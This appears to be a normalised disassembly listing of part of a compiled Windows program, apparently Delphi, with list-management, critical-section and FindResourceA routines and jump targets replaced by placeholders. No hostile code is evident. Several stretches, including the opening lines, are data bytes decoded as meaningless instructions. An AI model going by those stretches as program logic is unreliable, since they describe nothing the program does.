insd
jo r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
or [ gs : ebx + 0x41 ] dl
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc esp
and al 0x4
aam 0xe9
pop ds
jns r-xdata
jns r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
add ah cl
inc ebp
push ebx
inc ecx
add [ ebx + 0x53 ] dl
inc ecx
add [ ebp + 0x53 ] bl
inc ecx
add [ 0x67004153 ] bh
push ebx
inc ecx
add [ ebp + 0x53 ] dh
inc ecx
add [ edi + 0x53 ] bh
inc ecx
add [ edx ] al
inc esp
and al 0x4
aam 0xe9
or [ ecx ] edi
add [ ebx - 0x2bfbdbbc ] al
jmp sub_41cca8
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e80c95
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
pop ebp
retn 0x4
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
cmp [ ecx ] 0x0
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
add bh bh
sub_4153e8
cmpsb [ esi ] [ edi ]
push ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] ah
inc ecx
add ah ah
push esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x54 ] dh
inc ecx
add ah dl
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
add al al
dec eax
inc ecx
add [ eax ] ch
int3
sub_415494
mov esp 0xc40041c8
enter 0x41 0xc8
enter 0x41 0xe0
enter 0x41 0x14
leave
inc ecx
add ah ah
enter 0x41 0xec
enter 0x41 0xf0
enter 0x41 0xfc
enter 0x41 0xa8
leave
inc ecx
add [ ecx + ecx * 8 - 0x3427ffbf ] bh
inc ecx
add al ch
enter 0x41 0xcc
enter 0x41 0xb8
enter 0x41 0x0
int3
sub_4156bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f70
pop edi
pop esi
pop ebx
retn
sub_4156e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f54
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41570c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f78
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_415804
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_416b18
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403378
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403378
test al al
je r-xdata
sub_415864
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_415804
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415804
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403378
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4158d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403134
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4169bc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_415950
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
mov eax [ esi + 0x4 ]
call sub_403164
mov eax [ esi + 0x8 ]
call sub_403164
mov eax [ esi + 0xc ]
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_415990
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_416b18
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030c8
test al al
jne r-xdata
sub_4159f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_416b18
mov edx eax
mov eax ebp
call sub_403378
test al al
jne r-xdata
sub_415a34
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415acf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030b4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404100
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_415990
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4169bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ad6
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
sub_415af4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405114
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_415b14
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_416b18
mov edx edi
call sub_415af4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_416b18
mov edx edi
call sub_415af4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_416a08
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_415af4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_416a08
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_415bb8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_416b18
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4159f0
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_415c04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4158d4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4169bc
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_415c78
push ebx
push esi
push edi
push ebp
call sub_4034d8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_416b18
call sub_403164
inc edi
dec ebp
jne r-xdata
sub_415cd4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_416b18
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_415864
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_415d18
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_415990
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_416b18
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_415d5c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_415ddf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030b4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415de6
lea eax [ ebp - 0x10c ]
call sub_403e9c
retn
sub_415dec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_415cd4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4157f8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_415d5c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_416b18
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416b18
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403378
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_415cd4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416a08
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4169bc
sub_415ed8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_416b18
mov edx ebp
call sub_415adc
test al al
jne r-xdata
sub_415f1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4158d4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4169bc
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_416b18
mov eax [ eax + 0xc ]
mov edx ebp
call sub_416b74
test eax eax
jge r-xdata
sub_415f78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416b18
mov esi eax
mov edx ebp
mov eax esi
call sub_415b14
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403164
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416a08
sub_415fc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403134
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_4160c7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403470
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4160ce
mov eax [ rw-data ]
call sub_415f6c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4169bc
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_416b18
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4159f0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4169bc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_416b18
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4160ce
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4160f4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_416124
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_415eb4
xor edx edx
push ebp
push sub_41619b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_415f6c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403984
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_416b18
mov edx [ ebp - 0x4 ]
call sub_415990
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4161b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_416218
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41621f
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_416224
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_41626a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415d18
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416271
mov eax [ rw-data ]
call sub_415f6c
retn
sub_416278
push ebx
push esi
mov esi eax
mov eax esi
call sub_416224
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4161b8
sub_416298
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_4162fd
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_415ed8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_415ec0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416304
mov eax [ rw-data ]
call sub_415f6c
retn
mov eax ebx
call sub_4030f0
mov ebx eax
sub_416308
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_41634a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416351
mov eax [ rw-data ]
call sub_415f6c
retn
sub_416354
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_416396
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41639d
mov eax [ rw-data ]
call sub_415f6c
retn
sub_4163a0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_4163e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_415dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163ee
mov eax [ rw-data ]
call sub_415f6c
retn
sub_4163f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415eb4
xor eax eax
push ebp
push sub_416442
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_415bb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416449
mov eax [ rw-data ]
call sub_415f6c
retn
sub_4164a8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403470
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4164e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4164a8
mov edx eax
mov eax [ rw-data ]
call sub_416dfc
pop edi
pop esi
pop ebx
retn
sub_41650c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416e84
mov esi eax
xor edx edx
push ebp
push sub_416576
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
mov edx ebx
mov eax esi
call sub_416b18
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403984
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416588
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407cd4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4165c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ef0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41660c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_416b74
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4169bc
sub_416664
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_416b18
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4166a4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_416664
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4166c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40435c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_418fe8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41673c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_418ae8
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_41674c
push ebx
call sub_405e8c
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405e8c
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4169bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov ebx eax
call sub_405e8c
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov ebx eax
call sub_405e8c
mov [ eax + 0xc ] ebx
sub_4167a4
push ebx
push esi
push edi
call sub_405e8c
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_416b18
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
